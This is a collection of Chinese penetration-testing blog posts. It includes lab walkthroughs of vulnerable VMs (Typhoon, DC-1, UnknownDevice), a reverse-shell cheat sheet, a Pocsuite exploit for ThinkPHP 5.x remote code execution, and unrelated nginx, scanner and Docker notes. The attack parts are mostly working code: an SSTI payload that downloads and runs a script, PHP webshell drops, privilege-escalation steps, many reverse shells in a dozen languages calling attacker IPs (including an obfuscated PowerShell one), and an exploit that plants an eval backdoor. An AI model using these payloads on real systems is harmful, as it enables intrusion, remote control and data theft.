name=&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("wget http://192.168.220.135/a,py /tmp/")&#125;&#125;name=&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("python /tmp/a.py")&#125;&#125; Drupalgeddon2一键GetShell没错，是之前遇到过的drupalgeddon2 Lotus RCEuse exploit/multi/http/lcms_php_execset rhosts 192.168.220.134set uri /cms/run 注意uri格式，我在这里被坑了o_o …. SSH弱密码 针对OpenSSH 6.6.1用户枚举漏洞 auxiliary/scanner/ssh/ssh_enumusersset rhosts 192.168.201.6set threads 20set user_file /home/user/users.txtrun 爆出一个admin，目前为止共的三个用户名admin,typhoon,root,写入user.txt hydra -l /home/user/user.txt -P /home/user/pass.txt ssh://192.168.201.6 admin:metallica typhoon:789456123 PostgreSQL任意文件读取与写入use auxiliary/scanner/postgres/postgres_loginset rhosts 192.168.201.6run 枚举出弱密码 postgres:postgres 数据库是空的… CREATE TABLE test(t TEXT);COPY test FROM '/etc/passwd';SELECT * FROM test; 通过COPY读取文件 postfixuser 写入webshell DROP TABLE test;CREATE TABLE test(t TEXT);INSERT INTO test(t) VALUES ('&lt;?php @eval($_GET[cmd]);?&gt;');COPY test(t) TO '/var/www/html/cmd.php'; 然而连不上，返回空数据，尝试反弹，有引号报错…语法不熟悉，毕竟是即使学的…拿出navicat写，( •̀ ω •́ )y 其实这里还可以利用UDF提权，不过对应版本的.so我没有找到…自己搭建的话比较麻烦，就先放下了 Redis未授权访问 与MongoDb一样的利用链，一样的坑 CUPS远程打印服务GetShell&amp;提权作者设计预期应该是有631的cups这一操作但我死活复现不出来…..tcl CVE-2015-1158 Tomcat后台文件上传tomcat默认密码 将jsp反弹马(reverse.jsp)打包成zip，改后缀为war，上传访问http://192.168.201.6:8080/reverse/reverse.jsp tomcat7@typhoon:/var/lib/tomcat7$ whoamiwhoamitomcat7 成功拿到tomcat7权限的shell也可以使用msf的exploit/mutli/http/tomcat/tomcat_mgr_upload Struts2多处漏洞可以看到有两个struts2-showcase，拿出的struts-scan扫一波，刚好体验一下 python struts-scan.py http://192.168.201.6:8080/struts2-showcase/showcase.action 然而利用有问题…要是有时间的话，算了，不立flag了翻箱倒柜找到多个exp，体验都极差…..最后有一发还行，哎，还是得自己上手才能丰衣足食，事后再搞一波吧 提权提权方法一：SUID提权经典的SUID提权枚举S权限程序:find / -perm -4000 2&gt;/dev/null # 三个可疑程序/usr/bin/head/usr/bin/at/usr/bin/vim.basic head 直接head /etc/shadow成功拿到所有账户密码 root:$6$xlUx2G5p$.6IGWvV41rccKNfq7BeLhDFB6YZtsbpHGppKPZ0Cp9/1w1a/xx/UtyPy02f1gdv4tw4ibqOyzVcmwutrOiWlq1:17826:0:99999:7::: vim 这个vim有点奇怪，直接!/bin/bash或vim -c &#39;:!/bin/sh&#39;得到得依然是原权限得shell…但通过vim得shell再使用py的os库执行可以得到root vim -c ':python import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' at 这个at命令跟vim一样的坑 at -t $now `/bin/bash -i &gt;&amp; /dev/tcp/192.168.201.7/6666 0&gt;&amp;1` 得到的是原shell，但这次py也救不了了…利用失败 提权方法二：Crontab提权利用特权的head读取crontab任务 head /var/spool/cron/crontabs/root -n 50 # m h dom mon dow command*/1 * * * * /tab/script.sh 到tab下看一下，权限是777 typhoon@typhoon:/tab$ ls -ltotal 4-rwxrwxrwx 1 root root 86 Apr 19 20:16 script.shtyphoon@typhoon:/tab$ cat script.sh echo &quot;Typhoon is UP!&quot;#&lt;typh00n!&gt; P0st_3xpl01t3R_flaqGq &lt;typhoon!&gt; 写入反弹shell命令到script.sh typhoon@typhoon:/tab$ echo &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.220.140/6666 0&gt;&amp;1&quot; &gt; script.sh 未知原因反弹没生效，而nc是没有-e参数的那种 typhoon@typhoon:/tab$ echo "mkfifo /tmp/test;cat /tmp/test|/bin/sh -i 2&gt;&amp;1|nc 192.168.200.5 6666 &gt;/tmp/test" &gt; script.sh 提权方法三：内核提权内核提取最方便、快捷，但是有局限性,exp $python -m SimpleHTTPServerServing HTTP on 0.0.0.0 port 8000 ... typhoon@typhoon:/tmp$ wget 192.168.200.6:8000/37292.ctyphoon@typhoon:/tmp$ gcc 37292.c -o hactyphoon@typhoon:/tmp$ chmod +x hacktyphoon@typhoon:/tmp$ ./hack# whoamiroot 最后来试一下内核自动化提权脚本]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux&Win花式弹shell指南]]></title>
    <url>%2F2019%2F03%2F26%2Freverse-shell%2F</url>
    <content type="text"><![CDATA[NCnc -lvvp 6666 nc -e /bin/sh 192.168.220.140 6666 Bash /bin/bash -i &gt;&amp; /dev/tcp/192.168.220.140/6666 0&gt;&amp;1 PowerShellpowershell.exe -nop -ep bypass -Command "$RcvLFCUFMmdDX='192.168.220.140';$eGdTwRr=6666;$aPjzrf=New-Object System.Net.Sockets.TCPClient($RcvLFCUFMmdDX,$eGdTwRr);$ADWDNku=$aPjzrf.GetStream();[byte[]]$mvkwuYHrYO=0..65535|%&#123;0&#125;;$QPQlsQKzygeCwFV=([text.encoding]::ASCII).GetBytes('PS '+(Get-Location).Path+'&gt; ');$ADWDNku.Write($QPQlsQKzygeCwFV,0,$QPQlsQKzygeCwFV.Length);while(($KCaBvR=$ADWDNku.Read($mvkwuYHrYO,0,$mvkwuYHrYO.Length)) -ne 0)&#123;$anSGyc=([text.encoding]::ASCII).GetString($mvkwuYHrYO,0,$KCaBvR);try&#123;$gRrnhEIMpeoP=(Invoke-Expression -c $anSGyc 2&gt;&amp;1|Out-String)&#125;catch&#123;Write-Warning 'Something went wrong with execution of command on the target.';Write-Error $_;&#125;;$RcvLFCUFMmdDX0=$gRrnhEIMpeoP+'PS '+(Get-Location).Path+'&gt; ';$RcvLFCUFMmdDX1=($RcvLFCUFMmdDX2[0]|Out-String);$RcvLFCUFMmdDX2.clear();$RcvLFCUFMmdDX0=$RcvLFCUFMmdDX0+$RcvLFCUFMmdDX1;$QPQlsQKzygeCwFV=([text.encoding]::ASCII).GetBytes($RcvLFCUFMmdDX0);$ADWDNku.Write($QPQlsQKzygeCwFV,0,$QPQlsQKzygeCwFV.Length);$ADWDNku.Flush();&#125;;$aPjzrf.Close();if($RcvLFCUFMmdDX3)&#123;$RcvLFCUFMmdDX3.Stop();&#125;;" Python TCP python -c "import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.220.140',6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('/bin/bash');s.close();" python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.220.140",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' UDPps:nc -luvvp 6666 python -c "import os;import pty;import socket;soc=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);soc.connect(('192.168.220.140',6666));os.dup2(soc.fileno(),0);os.dup2(soc.fileno(),1);os.dup2(soc.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('/bin/bash');soc.close();" Telnettelnet 192.168.220.131 6666 | /bin/bash | telnet 192.168.220.131 6665nc -lvvp 6666 #命令传输窗口nc -lvvp 6665 #命令结果显示窗口 if [ -e /tmp/test ];then rm /tmp/test;fi;mkfifo /tmp/test;cat /tmp/test|/bin/sh -i 2&gt;&amp;1|telnet 192.168.220.140 6666 &gt; /tmp/test if [ -e /tmp/test ];then rm /tmp/test;fi;mknod /tmp/test p &amp;&amp; telnet 192.168.220.140 6666 0&lt;/tmp/test|/bin/bash 1&gt;/tmp/test AWKp=6666;awk -v port="$p" 'BEGIN&#123;soc="/inet/tcp/0/192.168.220.140/"port;while(8095856)&#123;do&#123;printf "shell&gt;"|&amp;soc;soc|&amp; getline inp;if(inp)&#123;while((inp|&amp; getline)&gt;0)print $0|&amp;soc;close(inp);&#125;&#125;while(inp!="exit")close(soc);break&#125;&#125;' /dev/null PHPphp -r "\$soc=fsockopen('192.168.220.140',6666);exec('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');" &lt;?php$sock = fsockopen('192.168.220.131', 6666);$descriptorspec = array( 0 =&gt; $sock, 1 =&gt; $sock, 2 =&gt; $sock ); $process = proc_open('/bin/sh', $descriptorspec, $pipes); proc_close($process);?&gt; Rubyruby -rsocket -e 'f=TCPSocket.open("192.168.220.131",6666).to_i;exec &gt; sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)' ruby -rsocket -e "exit if fork;soc=TCPSocket.new('192.168.220.140',6666);while(soc.print 'shell&gt;';cmd=soc.gets);IO.popen(cmd,'r')&#123;|io|soc.print io.read&#125;end" Perl TCP perl -MSocket -e "\$i='192.168.220.140';\$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$p,inet_aton(\$i))))&#123;open(STDIN,'&gt;&amp;S');open(STDOUT,'&gt;&amp;S');open(STDERR,'&gt;&amp;S');exec('/bin/sh -i');&#125;;" perl -MIO::Socket::INET -e "exit,if(fork);\$soc=new IO::Socket::INET(PeerAddr,'192.168.220.140:'.6666);\$soc-&gt;send('shell&gt;');STDIN-&gt;fdopen(\$soc,r);$~-&gt;fdopen(\$soc,w);system\$_ while&lt;&gt;;" UDPps:nc -luvvp perl -MIO::Socket::INET -e '$|=1;$soc = new IO::Socket::INET(PeerAddr =&gt; "192.168.220.140:".6666,Proto =&gt; "udp");while(1)&#123;$soc-send("shell&gt;");$soc-&gt;recv($inp,1024);$h=$soc-&gt;peerhost();$p=$soc-peerport();$d=qx($inp);$soc-&gt;send($d);&#125;' JavaRuntime r = Runtime.getRuntime();Process p = r.exec(new String[]&#123;"/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"&#125;);p.waitFor(); Runtime r = Runtime.getRuntime();Process p = r.exec(new String[]&#123;"/bin/bash","-c","bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"&#125;);p.waitFor(); Lualua -e "require('socket');require('os');t=socket.tcp();t:connect('192.168.220.131','6666');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[渗透实战:DC-1靶机入侵]]></title>
    <url>%2F2019%2F03%2F23%2FDC-1%2F</url>
    <content type="text"><![CDATA[0x01 序章 作者:DCAU 难度定位:未知，初级? 目标:共有五个flag，但最终目标是在root的主目录中 0x02 新玩意 这次来尝试一下新玩意，NetDiscover 这个发现工具我还是第一次用，虽然听说过很多次 # 先指定一下网卡sudo netdiscover -i eth2 192.168.135.131 鉴于上次的经验，这次我指定了更全面的扫描 nmap -sV -sS -p- 192.168.135.131 先试下admin，Access denied，好吧 那来跑下目录 然后…..然后站就被我跑崩了,🤦つ﹏⊂ 重启一下虚拟机，不跑了不跑了，先看看robots吧 通过UPGRADE.txt和MAINTAINERS.txt基本可以确认是Drupal 7.x(9 or 10) 0x03 Drupalgeddon2 GetShell 对于Drupal，我找到一个历害的洞，是远程命令执行 Msf中也有，但利用并不顺利 use exploit/unix/webapp/drupal_drupalgeddon2set rhosts 192.168.135.131set payload php/meterpreter_reverse_tcpset lhost 192.168.135.130run 反而在searchsploit中找到一个基于ruby的可用exp 成功拿到了shell，但我不死心再度尝试msf set payload php/reverse_phprun 事实证明，能弹回来 我再次进行一些测试 php/meterpreter_reverse_tcp PHP Meterpreter, Reverse TCP Inlinephp/meterpreter/reverse_tcp PHP Meterpreter, PHP Reverse TCP Stagergeneric/shell_reverse_tcp Generic Command Shell, Reverse TCP Inlinephp/reverse_php PHP Command Shell, Reverse TCP (via PHP) 前两者一个是使用命令行回连，一个是使用php回连，php回连能连上但无权限 而普通的generic和php都能正常工作，好的，可以说明是meterpreter的锅 然而体验还不如那个ruby的exp，卒~ 0x04 Flag1&amp;Flag2进来web目录下有一个flag1 DC-1&gt;&gt; cat flag1.txtEvery good CMS needs a config file - and so do you. 很明显的提示，一顿搜索，Drupal的配置文件在sites/default/settings.php Getflag2db:drupaldbusername:dbuserpassword:R0ck3t 那我们连上去mysql看看 mysql -udbuser -pR0ck3t 然而乱七八糟啥有用的信息都找不到 期间我又重新弹了一次shell，后来发现 哇咔咔，你懂的 gcc -o2 up.c 随后 我在本机搭建了一个简易的python服务器 并wget拿到exp chmod +x 2./2whoamiroot 然后再看一下别的路 0x05 SSH爆破提权这时我又想起了flag2的提示，跑字典.同时passwd中一个账号吸引了我的注意 就是它了。 [22][ssh] host: 192.168.135.131 login: flag4 password: orange 橙子，发现home下还有个flag4 0x06 基于find提权 注意：我在发现flag4前就已经通过find拿到root了，为了方便观看我把过程放到了这里，所以有些图片中的终端名对不上了 find / -perm -4000 2&gt;/dev/null find / -exec /bin/sh \; -quit find中提供了一处命令执行功能 0x07 Flag3虽然已经拿到了root并集齐了四个flag 但并没有找到flag3，同时想起flag2中将我们引向数据库的目的 数据库我仔细翻找过，并没有特殊的东西，我们能做的东西不多比如:得到管理员密码 那有什么用呢，登录后台? 如果是一般情况，估计只有跑john了，但这次不一样，我们知道盐 啊！还有更省事的方法，drupal自带了了加密 $S$DaVfvVLfyV4XMvqLm29dqXIRcxQRwUfkmDpfTKmULeuNPKDBk6p. 到数据库中 update users set pass = '$S$DaVfvVLfyV4XMvqLm29dqXIRcxQRwUfkmDpfTKmULeuNPKDBk6p.' where uid=1; 看样子我是直接跳过了hint，拿root了emmmmmm]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[渗透实战:UnknownDevice靶机入侵]]></title>
    <url>%2F2019%2F03%2F22%2FUnknownDevice%2F</url>
    <content type="text"><![CDATA[0x01 前言 难度定位:中级 作者：Ajay Verma 目标:获得root并阅读/root/flag.txt 0x02 主机扫描先扫一波 Nmap scan report for 192.168.135.129Host is up (0.0012s latency).Not shown: 999 closed portsPORT STATE SERVICE VERSION31337/tcp open http SimpleHTTPServer 0.6 (Python 2.7.14)|_http-server-header: SimpleHTTP/0.6 Python/2.7.14|_http-title: Website By Unknowndevice64 MAC Address: 00:0C:29:F9:6F:F5 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hop port 31337 python的简易HTTPServer 代码有hint 0x03 图片隐写术 是图片隐写，先后拿HxD和Stegsolve分析过，都不行 看了wp才知道要用steghide，出师不利 steghide --extract -sf key_is_h1dd3n.jpg 密码是h1dd3n 得到一串奇怪的东西 ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++++.-----------------.&lt;----------------.--.++++++.---------.&gt;-----------------------.&lt;&lt;+++.++.&gt;+++++.--.++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++.-----------------. 看着这串，倒是想到了以前接触过的jsfuck，但其实又不一样 查了些资料感觉可能是BrainFuck ud64:1M!#64@ud 还以为是啥加密，折腾许久，再次走投无路….偶然间发现，这名字emmm 这是用户名+密码?可是没有可以登录的地方啊，端口只有31337 sudo nmap -sV -p 1-65535 192.168.135.129 指定全端口，再扫一次，1337有SSH，看来就是它了 进来了??殊不知真正的挑战才刚刚开始 0x04 rbash限制逃逸上来就是ls ud64@unknowndevice64_v1:~$ ls-rbash: /bin/ls: restricted: cannot specify `/' in command names 先来看看这个rbash是个什么东西 这么变态???，经过一番搜索 发现可以通过按两下tab键调出可以执行的程序 最终找到两处可绕过限制shell的方法 vi 执行!/bin/sh export PATH=$PATH:/bin/ export PATH=$PATH:/usr/bin 但权限受限，环境变量是只读，只有vi了 很好，目前已经获得了一个’’较’’正常的shell，但是权限依然很低 事实上这只是在vi中运行的一个’shell’，那么先把它提到普通的shell 比如这样 这是因为在vi的shell中已经拥有了环境变量的写入权限了 0x05 破釜沉舟strace到root现在依旧没有办法读到root下的flag 查看了passwd，除root外，有bash的账户还有一个operator root:x:0:0::/root:/bin/bashoperator:x:11:0:operator:/root:/bin/bashud64:x:1000:1000::/home/ud64:/bin/rbash 但不知道密码，也找不到可行的内核提权 再度陷入僵局 最终，在先后检查了环境变量和进程后，在检查sudo可执行命令时发现 可以用sudo执行/usr/bin/sysud64但我并不清楚这是什么程序，幸好有help 其实这是strace，一个用以诊断，调试的程序，没错调试就意味着运行! sudo sysud64 -o /dev/null /bin/bash -i &gt;&amp; /dev/tcp/192.168.135.130/4444 0&gt;&amp;1 以root权限进行一次弹shell并把所有调试输出到最爱的黑洞 事后发现其实可以直接执行/bin/bash sudo sysud64 -o /dev/null /bin/bash 我不管，我就是要弹，小声逼逼 0x06 GetFlagA hacker does for love what others woud not do for money.]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于Pocsuite的ThinkPHP 5.x 远程代码执行漏洞利用]]></title>
    <url>%2F2019%2F01%2F11%2Fthinkphp-5-x-pocsuite%2F</url>
    <content type="text"><![CDATA[半醉半醒日复日,花落花开年复年。 2019了。 漏洞分析 漏洞分析有很多大佬巨佬做过了，我就不献丑了emmmm给大家找了一篇分析paper，建议去研究研究 水泡泡 漏洞详情 漏洞影响:Thinkphp 5.0.23及5.1.31以下(即12月9日安全更新前所有版本) vulnspy的漏洞源码 官方漏洞源码 官方github源码 Thinkphp v5.0.x补丁 Thinkphp v5.1.x补丁 seebug 注意:官网只有5.0.x的版本，测试5.1.x需要到github自己clone一个再用composer安装或者用vulnspy的 composer 全平台共有具有漏洞的类可以继续挖掘更多payload，我就不(tai)来(cai)了(le) think\Routethink\Loaderthink\Errorthink\Appthink\Envthink\Configthink\Hookthink\Langthink\Requestthink\Log 编写前准备对于网上的payload进行了收集,本打算基于以下四个payload进行Poc的编写 Request/inputindex.php?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1index.php?s=index/\think\Request/input&amp;filter=system&amp;data=echo%20%22&lt;?php%20eval($_POST[cmd])?&gt;%22%20&gt;%20a.php Request/cacheindex.php?s=index/\think\request/cache&amp;key=1|phpinfoindex.php?s=index/\think\request/cache&amp;key=dir|systemindex.php?s=index/\think\request/cache&amp;key=echo%20%22&lt;?php%20eval($_POST[cmd])?&gt;%22%20&gt;%20a.php|system container/invokefunctionindex.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoamiindex.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20phpinfo();?%3E app/invokefunctionindex.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoamiindex.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20%22&lt;?php%20phpinfo();?&gt;%22%20&gt;%20info.phpindex.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20phpinfo();?%3E 还有一个貌似只能写文件的 index.php?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20eval($_POST[123]);?%3C Payload测试测试的时候发现了些问题 前三个paylaod对于5.0.x无效，只有第四个有效 而5.1.x则通杀 结合水泡泡的分析 那就只有app/invokefunction一条路可以走了 Poc的编写#!/usr/bin/env python# coding: utf-8from pocsuite.net import reqfrom pocsuite.poc import POCBase, Outputfrom pocsuite.utils import registerclass ThinkphpPoC(POCBase): vulID = '97767' version = '1' author = ['p1n3'] vulDate = '2019-01-11' createDate = '2019-01-11' updateDate = '2019-01-11' references = ['https://www.seebug.org/vuldb/ssvid-97767'] name = 'Thinkphp 5.0.23及5.1.31以下 远程代码执行' appPowerLink = 'http://www.thinkphp.cn/' appName = 'Thinkphp' appVersion = '5.x' vulType = 'RCE' desc = ''' 由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下 可能的远程代码执行导致getshell，受影响包括Thinkphp全版本，建议更新到最新版或开启强制路由 ''' samples = [''] def _verify(self): result = &#123;&#125; payload = self.url + '/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array' \ '&amp;vars[0]=print_r&amp;vars[1][]=fae0b27c451c728867a567e8c1bb4e53' response = req.get(payload) # md5(666) 的值 if 'fae0b27c451c728867a567e8c1bb4e53' in str(response.content): result = &#123;'VerifyInfo': &#123;&#125;&#125; result['VerifyInfo']['payload'] = payload return self.parse_result(result) def _attack(self): result = &#123;&#125; info = &#123; 'ResultCode': &#123; 'a': False, 'b': False &#125; &#125; payload1 = self.url + '/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array' \ '&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20eval($_POST[666]);?%3E' payload2 = self.url + '/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array' \ '&amp;vars[0]=system&amp;vars[1][]=echo%20%22&lt;?php%20eval($_POST[666]);?&gt;%22%20&gt;%20info.php' req.get(payload1) if req.get(self.url + '/info.php').status_code == 200: result = &#123;'AttackInfo': &#123;&#125;&#125; info['ResultCode']['a'] = True result['AttackInfo']['payload'] = payload1 else: req.get(payload2) if req.get(self.url + '/info.php').status_code == 200: result = &#123;'AttackInfo': &#123;&#125;&#125; info['ResultCode']['b'] = True result['AttackInfo']['payload'] = payload2 if info['ResultCode']['a'] or info['ResultCode']['b']: result['AttackInfo']['shell'] = self.url+'/info.php' result['AttackInfo']['pass'] = '666' return self.parse_result(result) def parse_result(self, result): output = Output(self) if result: output.success(result) else: output.fail('The vulnerability does not appear to be available!') return outputregister(ThinkphpPoC) Poc测试 还是第一次用Pocsuite，写的不好…你来打我呀 相比pentestDB等，Pocsuite体验非常不错，打算以后就一直使用Pocsuite好了(如果有更好的框架请务必私信我) verify模式忘截图了 attack模式会直接在同目录下写一句话木马 祭出法器中国蚁剑 文件是info.php 密码666 很好 enjoy it]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python打造基于scapy的扫描器]]></title>
    <url>%2F2018%2F11%2F17%2Fweb-scan%2F</url>
    <content type="text"><![CDATA[准备事宜scapy库git clone https://github.com/secdev/scapy.gitcd ./scapypython setup.py 构思 放个三次握手原理图与被扫描机进行SYN握手，返回数据包不带 RST 标识就是开放了端口基本思路参考 scapy官方文档 如何用Scapy写一个端口扫描器？ Python的无状态SYN快速扫描 完整的项目我放到了github上 这里 预定义的全局变量#目标ip与端口ports = ''target = ''#定义是否用socket扫描，默认用synsocket_scan_mode = False#合计socket扫到端口socket_flag = 0# Pn = True# socket扫描多线程锁lock = threading.Semaphore(value=1)#默认扫描的端口default_ports = [...]#端口可能对应的服务port_list = &#123;...&#125; getopt模块处理用户输入def usage(): #用法提示 print "Usage: pineScan.py -t target_host (-p)" print " -h --help" print " -t --target" print " example: -t 127.0.0.1" print " -p --port" print " example: -p 80,445" print " -s --socket" #print " -Pn --skip host discovery" def init(): global ports global target global socket_scan_mode try: #对用户输入的参数解析 opts, args = getopt.getopt(sys.argv[1:],"hp:t:s",["help","port","target","socket"]) for o,a in opts: if o in ("-h","--help"): usage() exit(0) elif o in ("-t","--target"): target = a elif o in ("-p","--port"): ports = a elif o in ("-s","--socket"): socket_scan_mode = True elif o in ("-Pn"): Pn = True else: print "Unhandled Option" exit(0) if target: #调用扫描 portScan(target, ports) else: usage() exit(0) except Exception as e: print str(e) print usage() socket扫描核心代码socket扫描写都写了，懒得删了…emmmmdef socket_scan(target, port): #socket全连接 global socket_flag try: conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #设置超时 conn.settimeout(2) conn.connect((target, port)) lock.acquire() print '[*] %d/tcp open %s\r' % (port,port_list[port]) #计算开启的端口 socket_flag = socket_flag + 1 except: #线程释放 lock.release() conn.close() syn扫描核心代码def syn_scan(ip,ports): #构造数据包 ans,unans=sr(IP(dst=ip)/TCP(dport=ports, flags='S'),timeout = 5) print "PORT STATE SERVICE" for snd,rcv in ans: #从返回包读取数据 port = rcv.sprintf("%IP.sport%") service = rcv.sprintf("%TCP.sport%") flag = rcv.sprintf("%TCP.flags%") if flag == 'SA': #SA是开放了端口 if is_number(service): #包中信息的读取若为数字，调用字典查询可能的对应服务并替换 if service in port_list.keys(): service = port_list[service] else: service = 'unknown' #格式化输出 print '%-10.5sopen %s' % (port,service) 扫描调用模块#以逗号分割端口号ports = ports.split(",")#对string类型列表处理成int类型ports = [int(i) for i in ports]#判断是socket扫描还是syn扫描if socket_scan_mode: for port in ports: #多线程调用socket thread = threading.Thread(target=socket_scan, args=(target, int(port))) thread.start() if socket_flag == 0: print "socket scan done!but no port is open"else: #syn中整个列表传输执行比for循环更快 syn_scan(target,ports) 实际结果展示还算可以，技术所限，大佬轻喷]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[小站迁移记(Nginx自动化部署)]]></title>
    <url>%2F2018%2F11%2F09%2Fweb-migration%2F</url>
    <content type="text"><![CDATA[SSH部署阿里云vps直接在阿里云控制台导入ssh-keygen生成的秘钥秘钥生成看这里ssh git@serverip -i ~/.ssh/id_rsa 安装nginx apt-get updateapt-get install nginx/etc/init.d/nginx start 访问ip,看到Welcome to nginx! 配置成功了 安装Gitsudo apt-get install git#创建一个git用户,用于运行git服务sudo adduser git#导入秘钥到/home/git/.ssh/authorized_keys#修改权限chmod 600 authorized_keys#初始化git仓库git init --bare blo.git#更改所有权sudo chown -R git:git blog.git#禁止shell登录修改/etc/passwd的git:x:1003:1003::/home/git:/bin/bash改为git:x:1003:1003::/home/git:/usr/bin/git-shell#克隆远程仓库git clone git@serverip:/home/git/blog.git 配置nginx懒的配了,直接把html删了git clone /home/git/blog.git html 从仓库克隆过来直接替换掉 配置Git钩子hooksblog.git文件家里有一个hooks文件夹里边有各种hook例子$ vim blog.git/hooks/post-receive 写如下代码#!/bin/shunset GIT_DIR #还原环境变量，否则会拉不到代码cd /var/www/htmlgit pull origin master 注意要chmod 755 blog.git/hooks/post-receive 测试本地修改hexo配置文件deploy: type: git # 部署到我的git仓库 repo: git@serverip:/home/git/blog.git # 分支默认master branch: master ssh参考 nginx安装参考 nginx配置参考 Git服务器搭建参考 详细参考]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>vps</tag>
        <tag>nginx</tag>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker从入门到放弃]]></title>
    <url>%2F2018%2F10%2F28%2Fdocker-1%2F</url>
    <content type="text"><![CDATA[docker docker三大核心: 镜像 -镜像不可写 容器 -容器基于镜像生成(可写) 仓库 -仓库存储镜像(类似于Git的管理机制) docker的安装wget -qO- https://get.docker.com/ | sh 安装完后,将docker账户添加到用户组(非root)以便执行,然后登出再登录否则会报no permission sudo groupadd dockersudo gpasswd -a $&#123;USER&#125; dockersudo service docker restartnewgrp - docker #启动dockersudo service docker start #测试dockerdocker run hello-world 菜鸟教程 常用命令# 搜索镜像dicker search centos# 下载镜像docker pull name# -t 绑定伪终端 -i 保持标准输入 -d 后台运行 -p 端口映射docker run -t -i -p 1000:80 docker.io/centos /bin/bash# 展示所有镜像docker images# 保存镜像docker save -o centos7.tar docker.io/centos# 载入镜像docker load --input centos7.tar# 保存容器docker export id &gt; name.tar# 载入容器成为镜像cat name.tar | docker import - sherdh/ubuntu:v1.0# 查看正在运行的容器(所有)docker ps （-a）# 启动/终止容器docker start/stop id (-i)# 删除镜像docker rmi id# 删除容器docker rm id 那些折腾第一坑不要强制删除一个存在容器依赖的镜像即 -f ,因为会产生各种莫名其妙的问题先删除容器,如果容器在运行，需要先停止#查看所有容器docker ps -adocker rm 容器id 创建镜像基于已有容器docker commit -a "test" -m "add a new file" 容器id test(新镜像名字) 注意是容器id，不是镜像id 加tagdocker tag test:latest test/test:latest 加了tag后，有两个同id的images这时删除镜像报错Error response from daemon: conflict: unable to delete c30eab908457 (must be forced) - image is referenced in multiple repositories 删除时需要指定名字，而不是id 运行报错standard_init_linux.go:178: exec user process caused “exec format error”查到原因是docker不支持32位ubuntu…乖乖重装系统去 使用dockerfile创建镜像FROM ubuntuMAINTAINER test test@gmail.comRUN echo "deb http://archive.ubuntu.com/ubuntu/ raring main universe" &gt;&gt; /etc/apt/sources.listRUN apt-get update &amp;&amp; apt-get install -y nginx inotify-tools apache2 openssh-serverRUN echo "\ndaemon off;" &gt;&gt; /etc/nginx/nginx.conf# 自启动RUN bash -c 'echo "firefox" &gt;&gt; /.bashrc'# 打开端口EXPOSE 5900# 容器启动执行的命令CMD /usr/sbin/nginx]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>docker</tag>
